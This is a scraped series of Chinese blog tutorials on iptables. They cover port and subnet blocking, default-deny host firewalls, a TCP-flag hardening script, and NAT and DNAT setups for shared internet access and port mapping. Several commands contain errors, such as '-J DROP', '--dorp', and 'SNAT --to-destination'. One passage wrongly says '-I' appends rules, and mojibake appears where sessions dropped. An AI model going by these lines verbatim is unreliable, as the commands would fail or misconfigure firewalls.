extension）基本处理行为：ACCEPT（接受）、DROP（丢弃）、REJECT（拒绝）。比较：DROP好于REJECT（不要给reject，拒绝会给对方信息，透漏信息了）\r命令行执行的规则，仅仅在内存里临时生效。\n$ iptables -A INPUT -p tcp --dport 52113 -j DROP $ ÐÅºÅµÆ³¬Ê±Ê\r打台球：如果对方告诉你不去，REJECT（拒绝），如果对方没反应，DROP（丢弃）。\n(3) 恢复刚才断掉的SSH连接\n1. 去机房重启系统或者登陆服务器删除刚才的禁止规则。\r2. 让机房人员重启服务器或让机房人员拿用户密码登陆进去。\r3. 通过服务器的远程管理卡管理（推荐）。\r4. 先写一个定时任务，每5分钟就停止防火墙。\r5. 测试环境测试号，写成脚本，批量执行。\r我们恢复的办法，登陆虚拟终端页面删除掉刚才的规则。当然也可执行iptables -F， iptables stop等。 练习：禁止用户访问80端口或3306端口：\niptables -t filter -A INPUT -p tcp --dport 80 -j DROP\r$ telnet 192.168.1.5 80\rTrying 192.168.1.5...\rConnected to 192.168.1.5.\rEscape character is '^]'.\r^CConnection closed by foreign host.\r$ telnet 192.168.1.5 80\rTrying 192.168.1.5...\r$ iptables -nL\rChain INPUT (policy ACCEPT)\rtarget prot opt source destination DROP tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:80 使用-I和-A的顺序，防火墙的过滤根据规则顺序的。\n-A 是添加规则到指定链的结尾，最后一条。\n-I 是添加规则到指定链的结尾，第一条。\n$ iptables -nL\rChain INPUT (policy ACCEPT)\rtarget prot opt source destination $ iptables -A INPUT -p tcp -s 192.168.1.1 --dport 80 -j DROP\r$ iptables -nL\rChain INPUT (policy ACCEPT)\rtarget prot opt source destination DROP tcp -- 192.168.1.1 0.0.0.0/0 tcp dpt:80 查看规则序号：\niptables -L -n --line-numbers\r$ iptables -L -n --line-numbers Chain INPUT (policy ACCEPT)\rnum target prot opt source destination 1 DROP tcp -- 192.168.1.1 0.0.0.0/0 tcp dpt:80 2 DROP tcp -- 192.168.1.2 0.0.0.0/0 tcp dpt:80 Chain FORWARD (policy ACCEPT)\r指定位置插入规则：插入到第二行\n$ iptables -I INPUT 2 -p tcp -s 192.168.1.3 --dport 80 -j DROP $ iptables -L -n --line-numbers Chain INPUT (policy ACCEPT)\rnum target prot opt source destination 1 DROP tcp -- 192.168.1.1 0.0.0.0/0 tcp dpt:80 2 DROP tcp -- 192.168.1.3 0.0.0.0/0 tcp dpt:80 3 DROP tcp -- 192.168.1.2 0.0.0.0/0 tcp dpt:80 Chain FORWARD (policy ACCEPT)\r通过序号删除规则，删除上述第2条规则\n$ iptables -D INPUT 2 == delete from iptables where id=2\r$ iptables -L -n --line-numbers\rChain INPUT (policy ACCEPT)\rnum target prot opt source destination 1 DROP tcp -- 192.168.1.1 0.0.0.0/0 tcp dpt:80 2 DROP tcp -- 192.168.1.2 0.0.0.0/0 tcp dpt:80 Chain FORWARD (policy ACCEPT)\r小结：总结删除规则的方法：\n1. iptables -D INPUT -P tcp --dport 8080 -J DROP\r2. iptables -F 删除所有规则\r3. /etc/init.d/iptables restart （用iptables命令行配置的命令都是临时生效）\r4. iptables -D INPUT 序列号\r基于客户端源地址网段控制，禁止10.0.0.0网段连入\niptables -t filter -A INPUT -i eth0 -s 10.0.0.0/24 -J DROP\riptables -A INPUT -i eth0 -s 10.0.0.0/24 -J DROP\r注：iptables默认用的就是filter表，因此以上两条命令等价。 执行以上命令可以发现，我这里已经无法远程连接了。 登陆虚拟机，删除刚才禁止的来源地址为10网段的命令。 iptables -D INPUT -i eth0 -s 10.0.0.0/24 -J DROP (完整策略规则删除) iptables -D INPUT 1（根据策略在链中的序号删，每条链都是各自从1编号）。\n$ iptables -nL --line-numbers\rChain INPUT (policy ACCEPT)\rnum target prot opt source destination 1 DROP tcp -- 192.168.1.5 0.0.0.0/0 tcp dpt:80 2 DROP tcp -- 192.168.1.4 0.0.0.0/0 tcp dpt:80 3 DROP tcp -- 192.168.1.2 0.0.0.0/0 tcp dpt:80 Chain FORWARD (policy ACCEPT)\rn $ iptables -D INPUT 1\r$ iptables -nL --line-numbers\rChain INPUT (policy ACCEPT)\rnum target prot opt source destination 1 DROP tcp -- 192.168.1.4 0.0.0.0/0 tcp dpt:80 2 DROP tcp -- 192.168.1.2 0.0.0.0/0 tcp dpt:80 Chain FORWARD (policy ACCEPT) 还可以通过“！”来取反\n# 只有 192.168.1.1才可访问80端口 ！放在选项的前面而不是参数的前面\riptables -I INPUT -p tcp ! -s 192.168.1.1 --dport 80 -j DROP\r测试配置拒绝规则也是匹配：下面的测试有两个要点：非的作用，匹配拒绝也是匹配。\ncentos5版本\niptables -I INPUT -p tcp -s ! 192.168.1.1 --dport 80 -j DROP\rcentos6.4高版本：\n$ iptables -t filter -A INPUT -i eth0 -s ! 10.0.0.115 -j DROP\rUsing intrapositioned negation (`--option ! this`) is deprecated in favor of extrapositioned (`! --option this`).\r# 解决方案： iptables -t filter -A INPUT -i eth0 -s ! 10.0.0.115 -j DROP\r测试非”！“\n1.源地址不是10.0.0.101单个IP的禁止链接\niptables -t filter -I INPUT -i eth0 ! -s 10.0.0.101 -j DROP\riptables -A INPUT -p all -i eth0 ! -s 10.0.0.106 -j DROP # p(udp tcp icmp all)\r# 不让主机ping通\riptables -t filter -I INPUT -p icmp --icmp-type 8 -i eth0 -s ! 192.168.2.83 -j DROP\r# ssh 断开链接\r$ iptables -t filter -I INPUT -i eth0 ! -s 192.168.2.83 -j DROP\r$ ÐÅºÅµÆ³¬Ê±Ê\r# ping 不通\rC:\\Users\\Company\u0026gt;ping 192.168.2.83\r正在 Ping 192.168.2.83 具有 32 字节的数据:\r请求超时。\r请求超时。\r请求超时。\r192.168.2.83 的 Ping 统计信息:\r数据包: 已发送 = 4，已接收 = 0，丢失 = 4 (100% 丢失)，\r2.原地址不是192.168.2.0/24的网段禁止连接\niptables -t filter -I INPUT -i eth0 -s ! 192.168.2.0/24 -j DROP == iptables -t filter -I INPUT -i eth0 -s 192.168.2.0/24 -j ACCECT # 工作场景\r第一节讲了linux优化，更改root和和ssh端口\niptables -A INPUT -p tcp --dport 52113 ! -s 192.168.2.0/24 -J DROP\r在默认规则为允许的情况下，上述可以封堵ssh访问。\n企业工作中解决这个问题：\n1. vpn服务（拨号拨到VPN上，然后以VPN的内网地址区访问内部的机器地址）。\r2. 前端对外提供服务器的机器SSH端口都做禁止外部IP访问限制，可以开启后端或者不对外提供服务的机器，保留SSH服务（更改root和SSH端口）。然后，我们平时就先连接此机器没在去连其他机器。\r3. 流量特别大的外网机器不要开防火墙，会影响性能，购买硬件防火墙。\r封掉3306端口\niptables -A INPUT -p tcp --dorp 3306 -j DROP\r匹配指定的协议\niptables -A INPUT -P tcp # 如果不指定-p，默认就是all\r匹配指定协议外的所有协议\niptables -A INPUT -p ! tcp\riptables -I INPUT ! -p tcp -s 192.168.2.83 -j DROP\r匹配网段\niptables -A INPUT -s 10.0.0.0/24\riptables -A INPUT ! -s 10.0.0.0/24\r匹配单一端口\niptables -A INPUT -p tcp ! --sport 22\riptables -A INPUT -p tcp ! --dport 22 -s 10.0.0.20 -j DROP\r匹配端口范围\niptables -A INPUT -p tcp --sport 22:80\riptables -I INPUT -p tcp --dport 21,22,23,24 # 错误语法\riptables -I INPUT -p tcp -m multiport --dport 18:80 -j DROP\riptables -I INPUT -p tcp --dport 21:23 -j DROP # 最佳\r实例1：测试匹配端口范围\niptables -F\r$ iptables -t filter -A INPUT -p tcp --dport 20:100 -j DROP\rC:\\Users\\Company\u0026gt;telnet 192.168.2.83 80\r正在连接192.168.2.83...无法打开到主机的连接。 在端口 80: 连接失败\r$ iptables -nL\rChain INPUT (policy ACCEPT)\rtarget prot opt source destination DROP tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpts:20:100 测试结果\nssh52113端口终端直接断掉 telnet连接80不通 $ iptables -t filter -A INPUT -p tcp --dport 50000:60000 -j DROP $ ÐÅºÅµÆ³¬Ê±Ê\r实例2:列举端口\n$ iptables -t filter -A INPUT -p tcp -m multiport --dport 80,90,100 -j DROP\r$ iptables -nL\rChain INPUT (policy ACCEPT)\rtarget prot opt source destination DROP tcp -- 0.0.0.0/0 0.0.0.0/0 multiport dports 80,90,100 测试结果：telnet连接80不通\n$ telnet 192.168.1.5 80\r正在连接192.168.1.5...无法打开到主机的连接。 在端口 80: 连接失败\r匹配ICMC类型\niptables -A INPUT -p icmp --icmp-type 8\n例：iptables -A INPUT -p icmp --icmp-type 8 -j DROP\niptables -A INPUT -p icmp -m icmp --icmp-type any -j ACCEPT\riptables -A FORWARD -s 192.168.1.0/24 -p icmp -m icmp --icmp-type any -j ACCEPT\r# 在工作中默认是拒绝状态，用什么开什么，只有内网允许ping\r匹配指定的网络接口\niptables -A INPUT -i eth0\riptables -A FORWARD -o eth0\r记忆方法：\nin-interface -i input name\nin-interface -o output name\n匹配网络状态\n-m state \u0026ndash;state\nNEW：已经或将启动洗呢连接\nESTABLISHED：已经建立的连接\nRELATED：正在启动的新连接\nINVALID：非法或无法识别的\nFTP服务是特殊的，需要配状态连接。\n允许关联的状态包通过（web服务不要使用ftp）\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\riptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\r比喻：看电影出去WC或者接个电话，回来也得允许进去。\n限制指定时间包的允许通过数量及并发数 -m limit --limit n/{second/minute/hour/day}\n指定时间内的请求速率“n”为速率，后面为时间分别为：秒时分\n--limit-burst [n]: 在同一时间内允许通过的请求“n”为数字，不指定默认为5\n","permalink":"https://www.oomkill.com/2016/10/ch2-iptables-command/","summary":"","title":"ch2 iptables命令帮助信息"},{"content":"生产环境配置主机防火墙有两种模式：\n逛公园及看电影两种模式：\n逛公园：默认随便出进，对非法的分子进行拒绝。企业应用：企业配置上网网关路由。\n看电影：默认没有票进不去。花钱买票才能看电影。企业应用：服务器主机防火墙。\n很显然：第二种更严格，更安全。\n逛公园及看电影两种模式本事就是防火墙的默认规则是允许还是拒绝。\n1.清理当前所有规则和计数器\niptables -F\riptables -Z\riptables -X\r2.配置允许SSH登陆端口进入\niptables -A INPUT -p tcp --dport 52113 -j ACCEPT\riptables -A INPUT -p tcp -s 192.168.1.0/30 -j ACCEPT\r提示：此步骤是为了防止执行下面的步骤，把自己关在外面，除非你在本地处理，这部可以不做。\n3.设置允许本机lo通讯规则\niptables -A INPUT -i lo -j ACCEPT\riptables -A OUTPUT -o lo -j ACCEPT # output加不加都行，在工作环境上是加的\r4.设置默认的防火墙禁止和允许规则\niptables -P INPUT DROP\riptables -P FORWARD DROP\riptables -P OUTPUT ACCEPT\r一般情况下OUTPUT我们不要drop，像电影院一样，电影已经看完了，中间不想看就回家了，你不可能说不行不能走，所以一般出去没人管，进来才收票，OUTPUT一般不设置，但是不设置也有风险，企业流量暴涨，由于服务器中病毒外发流量。\n查看结果\n$ iptables -nL\rChain INPUT (policy DROP)\rtarget prot opt source destination ACCEPT tcp -- 192.168.1.0/27 0.0.0.0/0 tcp dpt:52113 ACCEPT all -- 0.0.0.0/0 0.0.0.0/0 Chain FORWARD (policy DROP)\rtarget prot opt source destination Chain OUTPUT (policy ACCEPT)\rtarget prot opt source destination ACCEPT all -- 0.0.0.0/0 0.0.0.0/0 5.开启网段信任\n允许IDC LAN/WAN和办公网ip的访问，及对外合作机构访问\n办公室固定IP段，IDC机房内网网段，其他机房内网网段，IDC机房外网网段\n例：\niptables -A INPUT -p all -s 192.168.1.0/27 -j ACCEPT\r安全提示：要细化到掩码最小，租用阿里云攻击同网段案例\n6.允许icmp类型协议通过\niptables -A INPUT -p icmp -m icmp --icmp-type any -j ACCEPT\r注： 如果不想开，就不执行此行命令。如果对内网开，对外不开就用下面方式。\niptables -A INPUT -p icmp -s 10.0.0.0/24 -m icmp --icmp-type any -j ACCEPT\r8.允许关联的状态包通过（web服务不要使用FTP）\n通过其他服务器扫描我们配置的防火墙：\n$ nmap 192.168.1.5 -p 1-65535 # 时间很长\rStarting Nmap 5.51 ( http://nmap.org ) at 2016-10-31 01:24 CST\rNmap scan report for 192.168.1.5\rHost is up (0.00024s latency).\rNot shown: 65533 filtered ports\rPORT STATE SERVICE\r80/tcp open http\r52113/tcp open unknown\rMAC Address: 00:0C:29:BE:2D:75 (VMware)\rNmap done: 1 IP address (1 host up) scanned in 117.86 seconds\r在命令行操作的每一条命令都是在内存里 ，没有写入磁盘里，重启服务就丢了\n在上面的命令行配置中所有的命令结果仅仅存在放于内存中，重启服务就会丢失。因此，我们有必要保存成配置文件。 法一：\n$ /etc/init.d/iptables save\riptables：将防火墙规则保存到 /etc/sysconfig/iptables：[确定]\r$ cat /etc/sysconfig/iptables\r# Generated by iptables-save v1.4.7 on Tue Nov 15 02:50:43 2016\r*filter\r:INPUT DROP [133073:5855518]\r:FORWARD DROP [0:0]\r:OUTPUT ACCEPT [202:14432]\r-A INPUT -s 192.168.1.0/27 -p tcp -m tcp --dport 52113 -j ACCEPT -A INPUT -p icmp -m icmp --icmp-type any -j ACCEPT -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT -A OUTPUT -o lo -j ACCEPT COMMIT\r# Completed on Tue Nov 15 02:50:43 2016\r法二：\n$ iptables-save \u0026gt;/etc/sysconfig/iptables\r提示：/etc/sysconfig/iptables为iptables的默认配置文件路径\n提示：第一次保存可以覆盖，以后保存只能追加\n","permalink":"https://www.oomkill.com/2016/10/ch3-iptables-configuration/","summary":"","title":"ch3 iptables配置防火墙"},{"content":"生产中，一般第一次添加规则命令行或者脚本加入然后一次性保存成文件，然后可以改配置文件管理：\n$ cat /etc/sysconfig/iptables\r# Generated by iptables-save v1.4.7 on Wed Nov 23 09:18:12 2016\r*filter\r:INPUT DROP [0:0]\r:FORWARD DROP [0:0]\r:OUTPUT ACCEPT [115:13341]\r-A INPUT -p tcp -m tcp --dport 52113 -j ACCEPT COMMIT\r# Completed on Wed Nov 23 09:18:12 2016\r生产维护：\n⑴ 确定规则\nvim /etc/sysconfig/iptables\r# 加入想要的规则：例如：\r-A INPUT -p tcp -m tcp --dport 873 -j ACCEPT\r/etc/init.d/iptables reload\r# 或者修改配置的同时命令行再执行，也是永久生效\r⑵ 命令行试错，没问题了，然后放配置文件。这时不需要重启了。\n封IP，第一行封。10.0.0.115 这个机器攻击我们服务器或者在BBS里发垃圾帖子。\n手工封IP：\niptables -I INPUT -s 10.0.0.115 -j DROP # 范围大，外部攻击者。\riptables -I INPUT -p tcp -s 10.0.0.106 --dport 80 -j DROP # 细，范围小 内部\r自动封IP：分析web或应用日志或者网络连接状态封掉垃圾IP\n详见：shell笔记\n#!/bin/sh\rIPT=/sbin/iptables\r# remove any existing rules\r$IPT -F\r$IPT -X\r$IPT -Z\r#setting default firewall policy\r$IP\r#setting forloopback interface\r$IPT -A INPUT -i lo -j ACCEPT\r$IPT -A OUTPUT -o lo -j ACCEPT\r# source address spoofing and other bad addresses\r$IPT -A INPUT -i eth0 -s 192.168.2.0/24 -j DROP\r$IPT -A INPUT -i eth0 -s 0.0.0.0/8 -j DROP\r#prevent all stealth scans and tcp state flags\r$IPT -A INPUT -p tcp --tcp-flags ALL ALL -j DROP\r#All of the bits are cleared\r$IPT -A INPUT -p tcp --tcp-flags ALL NONE -j DROP\r$IPT -A INPUT -p tcp --tcp-flags ALL,FIN,URG,PSH -j DROP\r#SYN and RST are both set\r$IPT -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP\r#SYN and FIN are both set\r$IPT -A INPUT -p tcp --tcp-flags SYN,FIN SYN,FIN -j DROP\r# FIN is the only bit set ,whitout the expected accompanying ACK\r$IPT -A INPUT -p tcp --tcp-flags ACK,FIN FIN -j DROP\r# PSH is the only bit set ,whitout the expected accompanying ACK\r$IPT -A INPUT -p tcp --tcp-flags ACK,PSH PSH -j DROP\r# URG is the only bit set ,whitout the expected accompanying ACK\r$IPT -A INPUT -p tcp --tcp-flags ACK,URG URG -j DROP\r#setting access rules\r#one,ip access rules,allow, all the ips of\r$IPT -A INPUT -s 10.0.10.0/24 -p tcp --dport 5666 -j ACCEPT\r$IPT -A INPUT -s 10.0.0.0/24 -p tcp --dport 5666 -j ACCEPT\r#db\r$IPT -A INPUT -s 10.0.0.0/24 -p tcp --dport 3306 -j ACCEPT\r$IPT -A INPUT -s 10.0.0.0/24 -p tcp --dport 3307 -j ACCEPT\r#ssh difference from other servers here\r$IPT -A INPUT -s 10.0.0.0/24 -p tcp --dport 52113 -j ACCEPT\r$IPT -A INPUT -s 10.0.0.0/24 -p tcp --dport 22 -j ACCEPT\r#http\r$IPT -A INPUT -p tcp --dport 80 -j ACCEPT\r#snmp\r$IPT -A INPUT -s 10.0.0.0/24 -p UDP --dport 161 -j ACCEPT\r#rsync\r$IPT -A INPUT -s 10.0.0.0/24 -p tcp --dport 873 -j ACCEPT\r$IPT -A INPUT -s 10.0.10.0/24 -p tcp --dport 873 -j ACCEPT\r#icmp\r$IPT -A INPUT -p icmp -m icmp --icmp-type any -j ACCEPT\r#others RELATED\r$IPT -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\r$IPT -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\r#setting default firewall rules\r$IPT -P OUTPUT ACCEPT\r$IPT --policy FORWARD DROP\r$IPT --policy INPUT DROP\r技巧：具备外网IP的服务器上不对外的服务最好要做源地址限制。\n对外提供服务，不能做源地址限制，例如：80端口。\n问题：企业硬件防火墙和IPTABLES防火墙是否要同时用。\n解决：可以同时用。\n举例：\n企业硬件防火墙一般放在网关位置，相当于大厦的保安。\n但是，楼道里的每个屋子还是需要有人或者锁门的（iptables）\n问题：IDC机房部署了硬件防火墙，我们的服务器可以不开防火墙吗？\n​\t解答：绝对不可以！大厦有保安，你的办公室就不锁门么？\n","permalink":"https://www.oomkill.com/2016/10/ch4-iptables-p/","summary":"","title":"ch4 生产环境如何维护iptables"},{"content":"1 办公室路由网关架构图 对应实际企业办公上网场景逻辑图\n2.实验环境配置需求前期准备 2.1 服务器网关B需要准备如下条件 物理条件是具备上网卡，建议eth0外网地址（这里是192.168.1.5,gw 192.168.1.2），ech1内网地址（这里是172.168.1.10，内网卡不配GW。 确保服务器网关B要可以上网（B上网才能代理别的机器上网）。可以通过ping baidu.com或外网IP测试。 内核文件/etc/sysctl.conf里开启转发功能。在服务器网关B192.168.1.5机器上开启路由转发功能。编辑/etc/sysctl.conf修改内容为net.ipv4.ip_forward = 1，然后执行sysctl -p使修改生效 iptables的filter表的FORWARD链允许转发 不要filter防火墙功能，共享上网，因此最好暂停防火墙测试/etc/init.d/tables stop 2.2 加载iptables内核模块 配置网关需要iptables的nat表，PREROUTING，POSTROUTING。\n(1)载入iptables内核模块，执行并放入rc.local\nmodprobe ip_tables \\\rmodprobe iptable_filter \\\rmodprobe iptable_nat \\\rmodprobe ip_conntrack \\\rmodprobe ip_conntrack_ftp \\\rmodprobe ip_nat_ftp \\\rmodprobe ipt_state\r$ lsmod|egrep ^ip iptable_nat 6051 0 iptable_filter 2793 0 2.3 局域网的机器： 局域网的机器有一块网卡即可，确保局域网的机器C，默认网关这只了网关服务器B的eth1内网卡IP（172.168l.1.10）。把主机C的gateway设置为B的内网卡192的网卡ip即172.168l.1.10。 检查手段： 分别ping网关服务器B的内外网卡IP，都应该是通的就对了. 出公网检查除了PING网站域名外，也要ping下外网ip，排除DNS故障。不通 ping 10.0.0.254网关也是不通的。 如上，请准备两台虚拟机B和C，其中B要有双网卡。B的内网卡的网段和C的网段一样。\n网关B：假设192.168.1.0/24为外部IP，172.168.1.0/24为内部IP\neth0:192.168.1.5 IPADDR=192.168.1.5\ngw:192.168.1.2\tGATEWAY=192.168.1.2\neth1 eth1:172.168.1.10\ngw：不配\n内部服务器C：\neth0：172.168.1.11 IPADDR=172.168.1.11\ngw：172.168.1.10（网关B的内网卡IP）\tGATEWAY=172.168.1.10\n准备结果：\nB网关服务器配置\n$ ifconfig\reth0 Link encap:Ethernet HWaddr 00:0C:29:31:E5:AF inet addr:192.168.1.4 Bcast:192.168.1.255 Mask:255.255.255.0\r......\reth1 Link encap:Ethernet HWaddr 00:0C:29:31:E5:B9 inet addr:172.168.1.10 Bcast:172.168.1.255 Mask:255.255.255.0\r# 路由\r$ route -n\rKernel IP routing table\rDestination Gateway Genmask Flags Metric Ref Use Iface\r192.168.1.0 0.0.0.0 255.255.255.0 U 0 0 0 eth0\r172.168.1.0 0.0.0.0 255.255.255.0 U 0 0 0 eth1\r169.254.0.0 0.0.0.0 255.255.0.0 U 1002 0 0 eth0\r169.254.0.0 0.0.0.0 255.255.0.0 U 1003 0 0 eth1\r0.0.0.0 192.168.1.2 0.0.0.0 UG 0 0 0 eth0\rC为内网PC或者服务器\n$ ifconfig\reth0 Link encap:Ethernet HWaddr 00:0C:29:BE:2D:75 inet addr:172.168.1.11 Bcast:172.168.1.255 Mask:255.255.255.0\r....\r$ route -n\rKernel IP routing table\rDestination Gateway Genmask Flags Metric Ref Use Iface\r172.168.1.0 0.0.0.0 255.255.255.0 U 0 0 0 eth0\r169.254.0.0 0.0.0.0 255.255.0.0 U 1002 0 0 eth0\r0.0.0.0 172.168.1.10 0.0.0.0 UG 0 0 0 eth0\r3 先做一些测试记录 1.登陆C主机172.168.1.11看是否能访问外部页面（配好DNS）。如ping www.baidu.com。正确结果：当前情况不通 lamp为10 lnmp为11\n$ ping www.baidu.com\r^C\r$ ping 61.105.221.1\rPING 61.105.221.1 (61.105.221.1) 56(84) bytes of data.\r2.在笔记本上分别测试telnet 172.168.1.10 22看是否能连通、结果:当前情况通。\n$ telnet 172.168.1.10 80\rTrying 172.168.1.10...\rConnected to 172.168.1.10.\rEscape character is '^]'.\t$ telnet 172.168.1.10 80\rTrying 172.168.1.10...\rConnected to 172.168.1.10.\rEscape character is '^]'\r在笔记本上分别测试ping 172.168.1.11看是否能连通。结果当前情况通。 测试登陆172.168.1.10看是否能访问外部页面。如ping www.baidu.com结果当前情况通。 在笔记本上分别测试telnet C主机 172.168.1.11 22 结果当前情况不通。 在笔记本上分别测试ping 172.168.1.11看是否能连通。结果当前情况不通。 4 根据逻辑图实现如下要求 4.1 局域网共享上网项目案例 1.实现c可经过b，通过A上因特网。 解答：提示2:注意主机防火墙功能的影响，可以尝试在GW上先/etc/init.d/iptables stop后在加命令\n2.实际处理的局域网共享上网NAT命令 局域网共享的两条命令方法：\n方法1：适合于有固定ip外网地址的：\niptables -t nat -A POSTROUTING -s 172.168.1.0/24 -o eth0 -j SNAT --to-source 192.168.1.4\r-s 172.168.1.0/24办公室或IDC、内网网段。 -o eth0 为网关的外网卡接口。 -j SNAT \u0026ndash;to-source 192.168.1.4是网关外网卡IP地址。 方法2：适合变化外网地址（ADSL）\niptables -t nat -A POSTROUTING -s 172.168.1.0/24 -j MASQUERADE\r测试结果\n$ ping www.baidu.com\rPING www.a.shifen.com (58.217.200.112) 56(84) bytes of data.\r64 bytes from 58.217.200.112: icmp_seq=1 ttl=127 time=32.1 ms\r$ iptables -t nat -nL\rChain PREROUTING (policy ACCEPT)\rtarget prot opt source destination Chain POSTROUTING (policy ACCEPT)\rtarget prot opt source destination SNAT all -- 172.168.1.0/24 0.0.0.0/0 to:192.168.1.4 为什么要用POSTROUTING？\n企业共享上网：\n1.办公网共享上网（网关要有外网IP，否则用路由（zebra））\n2.IDC内网机器上网\n企业上网到底需要不需要linux网关？\n解答：\n如果企业里有企业级路由器的情况下，可以不需要上网网关。使用网关只是解决路由器无法解决的需求（例如：上网行为，IP及端口的映射，网关杀毒）。 IDC机房，大厦有固定IP的宽带，直接用网关解决上网及控制问题。 4.2 把外部IP地址及端口映射到内部服务器地址及端口（和贡献上网环境一样） 在10段主机可以通过访问192.168.1.4:80，即可访问到192.168.1.8:9000 提供的web服务。也可SSH（192.168.1.4:222 \u0026ndash;\u0026gt; 192.168.1.8:52113）\u0026lt;== PREROUTING\nC配置WEB服务器\n解答：\n⑴ 在172.168.1.10开启http服务监听9000端口，然后在网关服务器B可以访问\n⑵ 具体转换命令：\niptables -t nat -A PREROUTING -d 192.168.1.5 -p tcp --dport 9000 -j DNAT --to-destination 172.168.1.11:80\r# DNAT：目的地址转换，将将本地内部的地址映射到互联网地址\r测试结果\n清空NAT表的规则。\niptables -t nat -F\r这个时候访问83的9000端口是不能访问的\niptables -t nat -A PREROUTING -d 192.168.2.83 -p tcp --dport 9000 -j DNAT --to-destination 172.168.1.11:80\r这里看到访问192.168.1.5的9000端口就会映射到内网172.168.1.11的80上。\nssh转发实验 # 网关A IP 192.168.2.83 内网IP 172.168.1.10\r$ ifconfig\reth0 Link encap:Ethernet HWaddr 00:0C:29:AF:21:4F inet addr:192.168.2.83 Bcast:192.168.2.255 Mask:255.255.255.0\reth1 Link encap:Ethernet HWaddr 00:50:56:20:37:C2 inet addr:172.168.1.10 Bcast:172.168.1.255 Mask:255.255.255.0\r# 在网关上设置转发\riptables -t nat -I PREROUTING -p tcp -m tcp --dport 9020 -j DNAT --to-destination 172.168.1.11:52113\r# 用外网访问网关外网IP\r$ ssh -p 9020 192.168.2.83\r.....\rroot@192.168.2.83's password: Last login: Mon Dec 12 22:24:58 2016 from 192.168.2.84\r$ ifconfig\rinet addr:172.168.1.11 Bcast:172.168.1.255 Mask:255.255.255.0\r强调：有个网友说网关服务需要开启80服务，但不需要对外服务？\n测试结果：网关开启httpd:80后。\n此时，来自80端口的请求转发依然会转发到后端的服务器。但是iptables nat规则删除后，此时就到达了http服务的80端口所以显示的是默认页面。\n企业应用场景：\n把访问外网IP及读研口的请求映射到内网某个服务器及端口（企业内部）。 硬件防火墙，把访问LVS/nginx外网VIP及80端口的请求映射到IDC负载均衡器内部IP及端口上（IDC机房的操作） iptables企业常用案例：\nlnux主机防火墙（表FILTER INPUT链） 局域网机器共享上网（表：NAT POSTROUTING链） iptables -t nat -A POSTROUTING -s 172.168.1.0/24 -o eth0 -j SNAT --to-source 192.168.1.5\r外部地址和端口，映射为内部地址和端口（表：NAT PREROUTING） iptables -t nat -A PREROUTING -d 192.168.1.5 -p tcp --dport 80 -j DNAT --to-destination 172.168.1.11:9000\r4.3 实现192段外网IP和172段内网IP一对一映射 网关IP：eth0:192.168.1.5 ech1:172.168.1.10\n首先在路由网关上绑定接口外网ip，可以是别名的方式。\n# 访问外网IP就映射到0.8\r-A PREROUTING -d 124.42.34.112 -j DNAT --to-destination 10.0.0.8\r# 出网时候改回去\r-A POSTROUTING -s 10.0.0.8 -j SNAT --to-destination 124.42.34.112\r# 当局域网使用外网IP访问这台机器，会出现问题，只要是局域网访问这个地址，冲定向到网关，防止可能环路\r-A POSTROUTING -s 10.0.0.0/255.255.240.0 -d 124.42.34.112 -j SNAT --to-source 10.0.0.254\r4.4 实现192段机器和10段机器互相访问 http://v.youku.com/v_show/id_XNTAyMjAwMzI0.html\n","permalink":"https://www.oomkill.com/2016/10/ch5-iptables-nat/","summary":"","title":"ch5 配置网关及服务器地址映射"},{"content":" 1、局域网共享上网（适合做企业内部局域网上网网关，以及IDC机房内网的上网网关 nat POSTROUTING）\n2、服务器防火墙功能（适合IDC机房具有外网IP服务器，主要是filter INPUT的控制）\n3、把外部IP及端口映射到局域网内部（可以一对一IP映射，也可针对某一个端口映射。）\n也可能是IDC把网站的外网VIP级网站端口映射到负载均衡器上（硬件防火墙）（NAT PREROUTING）\n4、办公路由器+网关功能（zebra路由+iptables过滤及NAT+squid正向透明代理80+ntop/iftop/iptaf流量查看+tc/cbq流量控制限速）。\n5、邮件的网关。\n问题2：的生产环境应用：用于没有外网地址的内网服务器，映射为公网IP后对外提供服务，也包括端口的映射\n问题3：IP一对一映射 用于没有外网地址的内网服务器，映射为公网IP后对外提供服务，例如：ftp服务要一对一IP映射。\n共享上网封IP的方法：\n/sbin/iptables -I FROWAED -s 10.0.0.26 -j　DROP\r/sbin/iptables ${deal} FROWARD -m mac --mac -source ${strIpMac} -j DROP\r映射多个外网IP上网 iptables -t nat -A POSTROUTING -s 10.0.1.0/255.255.240.0 -o eth0 -j SNAT --to-source 124.42.60.11-124.42.60.16\riptables -t nat -A POSTROUTING -s 172.168.1.0/255.255.255.0 -o eth0 -j SNAT --to=source 124.42.60.60-124.42.60.63\r问题：公司内网主机多的时候，访问网站容易被封。\n","permalink":"https://www.oomkill.com/2016/10/ch6-iptables-application/","summary":"","title":"ch6 iptables生产应用场景"},{"content":"调整内核参数文件/etc/sysctl.conf，以下是我们生产环境的某个服务器的配置：\n# 表示如果套接字由本端要求关闭，这个檀树决定了他保持在FIN-WAIT-2状态的时间。\rnet.ipv4.tcp_fin_timeout = 2\r# 表示开启重用。允许将TIME-WAIT sockets重新用于新的TCP连接，默认为0，表示关闭。\rnet.ipv4.tcp_tw_reuse = 1\r# 表示开启TCP连接中TIME-WAIT socket的快速收回，默认为0，表示关闭\rnet.ipv4.tcp_tw_recycle = 1\r提示：以上两个参数为了防止生产环境下 time_wait过多设置的。\r############################################################\r# 表示开启SYN Cookie。当出现SYN等带队列溢出时，启动cookie来处理，可防范少量SYN攻击，默认为0表示关闭\rnet.ipv4.tcp_syncookies = 1\r# 表示当keepalive起用的时候，TCP发送keepalive消息的频度。缺省是两小时，改为20分钟 单位秒\rnet.ipv4.tcp_keepalive_time = 1200\r# 表示对用向外连接的端口范围。缺省情况下很小。\rnet.ipv4.ip_local_port_range = 4000 65000\r# 表示SYN队列的长度，默认为1024，加大队列长度为8192，可容纳更过等待连接的网络连接数。\rnet.ipv4.tcp_max_syn_backlog = 16384\r# 表示系统同时保持TIME_WAIT套接字的最大数量，如果超过这个数字，TIME_WAIT套接字将立刻被清楚并打印警告信息。默认为180000，对于Apache 